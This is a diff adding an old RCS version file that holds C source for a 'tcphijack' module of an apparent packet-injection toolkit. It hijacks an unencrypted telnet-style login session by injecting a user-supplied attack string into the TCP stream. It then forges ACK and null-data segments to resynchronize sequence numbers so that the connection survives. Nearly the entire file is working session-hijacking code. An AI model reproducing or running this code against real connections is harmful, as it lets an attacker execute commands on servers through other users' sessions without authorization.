@@ -1,0 +1,301 @@
+head     1.1;
+branch   1.1.1;
+access   ;
+symbols  ipse-pcap:1.1.1.1 ipse-pcap:1.1.1;
+locks    ; strict;
+comment  @ * @;
+
+
+1.1
+date     97.06.17.01.09.03;  author gribble;  state Exp;
+branches 1.1.1.1;
+next     ;
+
+1.1.1.1
+date     97.06.17.01.09.03;  author gribble;  state Exp;
+branches ;
+next     ;
+
+
+desc
+@@
+
+
+
+1.1
+log
+@Initial revision
+@
+text
+@/* 
+   Created 5/15/97 -- kaminsky
+
+   This module hijacks a telnet or other such unencrypted remote login
+   session by placing an "attack string" into the TCP data stream and
+   then resynchronizing the SEQ/ACK numbers.
+
+   The module takes five arguments in the following order:
+      attack string, source host, source port, dest. host, dest. port
+
+   Usually, source corresponds to the client and destination to the server.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "packet.h"
+#include "stream.h"
+#include "module.h"
+#include "uifile.h"
+#include <pcap.h>
+
+/* NOTE: all values are stored in Network Byte Order */
+typedef struct {
+    int stage;
+    u_char *data;
+    int datalen;
+    int src_port;
+    int dst_port;
+    unsigned long src_host;
+    unsigned long dst_host;
+} state_t;
+
+static void * tcphijack_init(int handid, char *arg)
+{
+    state_t *state = malloc(sizeof(state_t));
+    if (state == NULL) return (INIT_FAIL);
+    state->stage = 0;
+    state->data = NULL;
+    state->datalen = 0;
+    state->src_port = 0;
+    state->dst_port = 0;
+    state->src_host = 0;
+    state->dst_host = 0;
+ 
+    if (arg) {
+	char *larg = strdup(arg);
+	char *c,*s;
+	int field = 0;
+	if (larg == NULL) return (INIT_FAIL);
+
+	c = larg;
+	while((s = strsep(&c,",")) != NULL && field < 5) {
+	    switch(field) {
+		char *tmp;
+	    case 0:
+		/* data to insert */
+		tmp = strdup(s);
+		state->data = (char *) malloc(strlen(tmp)+1);
+		sprintf(state->data, "%s\n", tmp);
+		state->datalen = strlen(state->data);
+		break;
+	    case 1:
+		/* source host */
+		state->src_host = resolve_name(s);
+		break;
+	    case 2:
+		/* source port */
+		state->src_port = htons(atoi(s));
+		break;
+	    case 3:
+		/* destination host */
+		state->dst_host = resolve_name(s);
+		break;
+	    case 4:
+		/* destination port */
+		state->dst_port = htons(atoi(s));
+		break;
+	    }
+	    ++field;
+	}
+	free(larg);
+    }
+    
+    return state;
+}
+
+static int tcphijack_handle(interface_t *interface, void *st)
+{
+    state_t *state = (state_t *)st;
+    int wd;
+    ip_packet_t *packet;
+
+    /*
+    if (interface->frame_type == DLT_EN10MB) {
+    } else if (interface->frame_type == DLT_PPP) {
+    } else {
+    }
+    */
+
+    packet = interface->packet;
+    wd = interface->wd;
+
+    switch (state->stage) {
+    case 0:
+	/* Wait for an ACK from the server (dest.) to the client (src).
+	   Then, send the data we want to insert back using the ACK number
+	   from the the packet as our sequence number 
+	*/
+
+	/* Code that seems to work for linux servers */
+	if ((packet->iphead.ip_p == IPPROTO_TCP) &&
+	    (packet->p.tcp.head.th_flags & TH_ACK) &&
+	    (packet->p.tcp.head.th_sport == state->dst_port) &&
+	    (packet->p.tcp.head.th_dport == state->src_port) &&
+	    (packet->iphead.ip_src.s_addr == state->dst_host) &&
+	    (packet->iphead.ip_dst.s_addr == state->src_host)) {
+	    printf("Sending attack string...\n");
+	    send_tcp(wd,
+		     state->data,
+		     state->datalen,
+		     packet->p.tcp.head.th_dport,
+		     packet->p.tcp.head.th_sport,
+		     packet->iphead.ip_dst.s_addr,
+		     packet->iphead.ip_src.s_addr,
+		     packet->p.tcp.head.th_ack,
+		     0,
+		     TH_PUSH);
+
+/* Experimental code
+	if ((packet->iphead.ip_p == IPPROTO_TCP) &&
+	    (packet->p.tcp.head.th_flags & TH_ACK) &&
+	    (packet->p.tcp.head.th_flags & TH_PUSH) &&
+	    (packet->p.tcp.head.th_sport == state->src_port) &&
+	    (packet->p.tcp.head.th_dport == state->dst_port) &&
+	    (packet->iphead.ip_src.s_addr == state->src_host) &&
+	    (packet->iphead.ip_dst.s_addr == state->dst_host)) {
+
+	    int len;
+	    len = ntohs(packet->iphead.ip_len) - (packet->iphead.ip_hl * 4);
+	    len -= (packet->p.tcp.head.th_off * 4);
+
+	    printf("Sending attack string...\n");
+	    send_tcp(wd,
+		     state->data,
+		     state->datalen,
+		     packet->p.tcp.head.th_sport,
+		     packet->p.tcp.head.th_dport,
+		     packet->iphead.ip_src.s_addr,
+		     packet->iphead.ip_dst.s_addr,
+		     htonl(ntohl(packet->p.tcp.head.th_seq)+len),
+		     packet->p.tcp.head.th_ack,
+		     TH_PUSH|TH_ACK);
+*/
+
+	    state->stage = 1;
+	}
+	break;
+    case 1:
+	/* Now, we ACK the echo of our attack string that is sent back by 
+	   the server + any output the command generated.  We also send
+	   an equal number of NULL bytes of data to the client so that it
+	   updates its ACK numbers.
+	*/
+	if ((packet->iphead.ip_p == IPPROTO_TCP) &&
+	    (packet->p.tcp.head.th_flags & TH_ACK) &&
+	    (packet->p.tcp.head.th_flags & TH_PUSH) &&
+	    (packet->p.tcp.head.th_sport == state->dst_port) &&
+	    (packet->p.tcp.head.th_dport == state->src_port) &&
+	    (packet->iphead.ip_src.s_addr == state->dst_host) &&
+	    (packet->iphead.ip_dst.s_addr == state->src_host)) {
+
+	    /* length of the actual TCP data (no headers) */
+	    int len;
+	    char empty[1600];
+
+	    memset(empty, 0, sizeof(empty));
+	    len = ntohs(packet->iphead.ip_len) - (packet->iphead.ip_hl * 4);
+	    len -= (packet->p.tcp.head.th_off * 4);
+
+	    printf("ACKing server's response to attack string... \n");
+
+	    send_tcp(wd,
+		     "",
+		     0,
+		     packet->p.tcp.head.th_dport,
+		     packet->p.tcp.head.th_sport,
+		     packet->iphead.ip_dst.s_addr,
+		     packet->iphead.ip_src.s_addr,
+		     packet->p.tcp.head.th_ack,
+		     htonl(ntohl(packet->p.tcp.head.th_seq)+len),
+		     TH_ACK);
+
+	    printf("Synchronizing client's ACK numbers... \n");
+
+	    send_tcp(wd,
+		     empty,
+		     len,
+		     packet->p.tcp.head.th_sport,
+		     packet->p.tcp.head.th_dport,
+		     packet->iphead.ip_src.s_addr,
+		     packet->iphead.ip_dst.s_addr,
+		     packet->p.tcp.head.th_seq,
+		     0,
+		     TH_PUSH);
+
+	    state->stage = 2;
+	}
+	break;
+    case 2:
+	/* Finally, we need to ACK the next "datalen" number of packets
+	   from the client who is still sending with the OLD (pre-attack
+	   string) sequence numbers.  There probably is a better way to
+	   do this; as is, the client users will think he/she has lost 
+	   some data.
+	*/
+	if ((packet->iphead.ip_p == IPPROTO_TCP) &&
+	    (packet->p.tcp.head.th_flags & TH_ACK) &&
+	    (packet->p.tcp.head.th_flags & TH_PUSH) &&
+	    (packet->p.tcp.head.th_sport == state->src_port) &&
+	    (packet->p.tcp.head.th_dport == state->dst_port) &&
+	    (packet->iphead.ip_src.s_addr == state->src_host) &&
+	    (packet->iphead.ip_dst.s_addr == state->dst_host) &&
+	    (state->datalen > 0)) {
+
+	    /* length of the actual TCP data (no headers) */
+	    int len;
+	    len = ntohs(packet->iphead.ip_len) - (packet->iphead.ip_hl * 4);
+	    len -= (packet->p.tcp.head.th_off * 4);
+
+	    state->datalen -= len;
+
+	    printf("Synchronizing client's SEQ numbers... %d\n",
+		   state->datalen);
+
+	    send_tcp(wd,
+		     "",
+		     0,
+		     packet->p.tcp.head.th_dport,
+		     packet->p.tcp.head.th_sport,
+		     packet->iphead.ip_dst.s_addr,
+		     packet->iphead.ip_src.s_addr,
+		     packet->p.tcp.head.th_ack,
+		     htonl(ntohl(packet->p.tcp.head.th_seq)+len),
+		     TH_ACK);
+	} else if (state->datalen <= 0) {
+	    printf("Hijack complete.\n");
+	    state->stage = 3;
+	}
+	break;
+    }
+
+    return 0;
+}
+
+static void tcphijack_clean(void *st)
+{
+    state_t *state = (state_t *)st;
+    free(state);
+}
+
+int nops = 1;
+module_ops oplist[] = { { tcphijack_init, tcphijack_handle, tcphijack_clean } };
+@
+
+
+1.1.1.1
+log
+@Wohoo--ipse over pcap!
+@
+text
+@@
